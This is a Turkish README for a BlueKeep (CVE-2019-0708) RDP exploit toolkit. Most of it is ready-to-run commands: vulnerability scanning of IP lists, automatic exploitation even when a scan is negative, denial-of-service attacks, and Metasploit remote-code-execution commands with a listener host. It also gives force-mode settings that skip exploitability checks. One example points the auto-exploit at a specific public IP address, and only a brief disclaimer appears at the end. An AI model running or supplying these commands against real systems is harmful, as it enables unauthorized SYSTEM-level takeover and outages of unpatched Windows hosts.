# BlueKeep (CVE-2019-0708) Exploit Toolkit

Bu toolkit, BlueKeep (CVE-2019-0708) güvenlik açığından etkilenen Windows sistemlerine yönelik çeşitli sömürü ve test araçları içerir.
![alt text](image-1.png)
![alt text](image.png)
## İçindekiler

- [Genel Bilgi](#genel-bilgi)
- [Desteklenen Sistemler](#desteklenen-sistemler)
- [Kurulum](#kurulum)
- [Kullanım](#kullanım)
  - [Vulnerability Scanning](#vulnerability-scanning)
  - [Proof of Concept (PoC)](#proof-of-concept-poc)
  - [Denial of Service (DoS)](#denial-of-service-dos)
  - [Metasploit ile Sömürü](#metasploit-ile-sömürü)
- [Sorun Giderme](#sorun-giderme)
- [Ek Araçlar](#ek-araçlar)
- [Güvenlik Uyarısı](#güvenlik-uyarısı)

## Genel Bilgi

BlueKeep veya CVE-2019-0708, aşağıdaki Windows sistemlerini etkileyen bir RCE (Remote Code Execution) güvenlik açığıdır:

- Windows 2003
- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2008
- Windows Server 2008 R2

Bu güvenlik açığı, kullanıcı doğrulama gerektirmeden (pre-authentication) uzaktan kod çalıştırmaya imkan verir ve NT Authority\system kullanıcı bağlamında çalışabilir.

## Desteklenen Sistemler

| Hedef ID | İşletim Sistemi | Notlar |
|----------|-----------------|--------|
| 0 | Otomatik hedefleme | Her durumda doğru çalışmayabilir |
| 1 | Windows 7 SP1 (6.1.7601 x64) | Kurumsal ortamlarda yaygın |
| 2 | Windows 7 SP0 (6.1.7600 x64) | **TAVSİYE EDİLEN** - Test için en güvenilir |
| 3 | Windows Server 2008 R2 SP1 (6.1.7601 x64) | fDisableCam=0 ayarı gerektirir |
| 4 | Windows Server 2008 R2 SP0 (6.1.7600 x64) | fDisableCam=0 ayarı gerektirir |
| 5 | Windows Server 2008 SP1 (6.0.6001 x64) | fDisableCam=0 ayarı gerektirir |

## Kurulum

### Gereksinimler
```bash
sudo apt install python3 python3-dev python3-pip openssl libssl-dev git
```

### Bağımlılıkları Yükleme
```bash
pip3 install -r requirements_fixed.txt
```

Ya da script ile otomatik yükleme:
```bash
python3 bluekeep_runner.py -i HEDEF_IP
```

## Kullanım

### Vulnerability Scanning

BlueKeep açığını taramak için öncelikle Metasploit ile tarama yapabilirsiniz:

```bash
msfconsole -q
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS HEDEF_IP
set RPORT 3389
run
```

Ya da sağlanan Python script ile:

```bash
python3 bluekeep_scanner.py -i HEDEF_IP -p 3389
```

Bir IP listesini taramak için:
```bash
python3 bluekeep_scanner.py -f ip_listesi.txt
```

#### Otomatik Exploit Seçenekleri

Tarama ve otomatik exploit için:
```bash
python3 bluekeep_scanner.py -i HEDEF_IP -a
```

Tüm hedefleri tarama sonucuna bakılmaksızın exploitlemeyi denemek için:
```bash
python3 bluekeep_scanner.py -i HEDEF_IP -x
```

Başka bir yaklaşım olarak, bash script ile tek komutta tarama, işletim sistemi tespiti ve exploit:
```bash
./auto_bluekeep.sh HEDEF_IP
```

### Proof of Concept (PoC)

PoC modunu çalıştırmak için:
```bash
python3 bluekeep_runner.py -i HEDEF_IP -p 3389 -m poc -v
```

Local runner ile çalıştırmak için (bağımlılıkları kurmadan):
```bash
python3 local_bluekeep_runner.py -i HEDEF_IP -p 3389 -m poc -v
```

### Denial of Service (DoS)

DoS (servis dışı bırakma) modunu çalıştırmak için:
```bash
python3 bluekeep_runner.py -i HEDEF_IP -p 3389 -m dos -a 64 -t 3 -w 2
```

Parametreler:
- `-a`: Hedef mimarisi (32 veya 64 bit)
- `-t`: Saldırı deneme sayısı
- `-w`: Denemeler arasındaki bekleme süresi (saniye)

### Metasploit ile Sömürü

#### Otomatik OS Tespiti ve Exploit
İşletim sistemi tespiti yaparak en uygun TARGET ID değeriyle exploit:
```bash
python3 metasploit_bluekeep.py -i HEDEF_IP -A
```

Bu özellik:
1. Hedef sistemin RDP özelliklerini kullanarak işletim sistemi sürümünü tespit eder
2. Windows 7 SP1, Windows 7 SP0, Windows Server 2008 R2 gibi sistemler için özel TARGET değerlerini belirler
3. Server 2008 sistemleri için gereken fDisableCam=0 ayarı hakkında uyarı verir
4. Tespit edilen işletim sistemine göre uygun TARGET ID ile exploit başlatır

Örnek kullanım:
```bash
# İşletim sistemi tespiti ve exploit
python3 metasploit_bluekeep.py -i 175.200.128.148 -A

# Tarama, işletim sistemi tespiti ve exploit (tek komut)
python3 bluekeep_scanner.py -i 175.200.128.148 -a
```

#### Automatic Runner
```bash
python3 metasploit_bluekeep.py -i HEDEF_IP -l YEREL_IP -t 2
```

Parametreler:
- `-i`: Hedef IP adresi
- `-l`: Yerel IP adresi (varsayılan: otomatik tespit)
- `-t`: Hedef ID (varsayılan: 2 - Windows 7 SP0)
- `-p`: Hedef port (varsayılan: 3389)
- `-o`: Yerel bağlantı port (varsayılan: 4444)
- `-f`: Otomatik kontrol atlamayı zorla (varsayılan: Evet)
- `-v`: Ayrıntılı çıktı
- `-d`: Hata ayıklama modu

#### Tarama ve Sömürü
Tek bir komutla tarama ve açık varsa sömürme:
```bash
python3 metasploit_bluekeep.py --scan -i HEDEF_IP -l YEREL_IP -t 2
```

Veya manuel olarak Metasploit'te:
```bash
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS HEDEF_IP
set RPORT 3389
set LHOST YEREL_IP
set TARGET 2
run
```

#### Doğrudan Çalıştırma (Force Mode)
```bash
python3 force_bluekeep.py -i HEDEF_IP -l YEREL_IP -t 2
```

veya

```bash
python3 force_exploit.py -i HEDEF_IP -l YEREL_IP -t 2
```

#### Manuel Metasploit Komutları

Manuel komut oluşturmak için:
```bash
python3 bluekeep_direct.py -i HEDEF_IP
```

## Sorun Giderme

### RDP Servis Kontrolü

Exploitlerin başarısız olmasının en yaygın sebeplerinden biri hedef sistemde RDP servisinin olmaması veya servisin erişilebilir olmamasıdır. Bunu kontrol etmek için:

```bash
python3 check_rdp_detailed.py -i HEDEF_IP -p 3389
```

Bu araç, aşağıdaki kontrolleri gerçekleştirir:

1. Temel port erişilebilirlik kontrolü
2. RDP protokol imza kontrolü
3. Nmap ile servis tespiti (varsa)
4. Metasploit ile güvenlik açığı kontrolü

### Örnek RDP Sorun Giderme Adımları

1. Önce temel RDP bağlantısını doğrulayın:
   ```bash
   nc -vz HEDEF_IP 3389
   ```

2. RDP servisini ve ayrıntılı bilgileri kontrol edin:
   ```bash
   python3 check_rdp_detailed.py -i HEDEF_IP
   ```

3. Sorun devam ederse, zorla exploit deneyin:
   ```bash
   python3 force_bluekeep.py -i HEDEF_IP
   ```

### Metasploit ile ilgili sorunlar

1. Hedef tespit hatası alırsanız:
   ```
   Exploit aborted due to failure: unknown: Cannot reliably check exploitability
   ```
   Çözüm: Force modunu kullanın
   ```
   set ForceExploit true
   set AutoCheck false
   ```

2. Bad-config hatası alırsanız:
   ```
   Exploit aborted due to failure: bad-config: Set the most appropriate target manually
   ```
   Çözüm: Hedef ID değerini 2 olarak ayarlayın (Windows 7 SP0)
   ```
   set TARGET 2
   ```

## Ek Araçlar

### Bash Script ile Otomatik Tarama ve Exploit
```bash
./auto_bluekeep.sh HEDEF_IP [PORT]
```

Bu script:
1. Hedef sistemin RDP portunu kontrol eder
2. BlueKeep zafiyeti için tarama yapar
3. İşletim sistemini otomatik tespit eder
4. Uygun TARGET ID ile exploit başlatır

### Local Test Environment
```bash
python3 rdp_listener.py -p 8389 -v
```

ve başka bir terminal penceresinde:
```bash
python3 self_test.py -p 8389 -m poc -v
```

### Hedef Tespiti için
```bash
python3 bluekeep_direct.py -i HEDEF_IP -p 3389
```

## Güvenlik Uyarısı

Bu araçlar, sadece yasal penetrasyon testleri ve güvenlik araştırmaları için kullanılmalıdır. İzinsiz sistemlere erişmek yasadışıdır. Bu araçların kötü amaçlı kullanımından doğacak sonuçlardan kullanıcı sorumludur.

---

Developed based on research by [Ekultek](https://github.com/Ekultek) and [NullArray](https://github.com/NullArray)
Enhanced with Metasploit integration and additional tools.
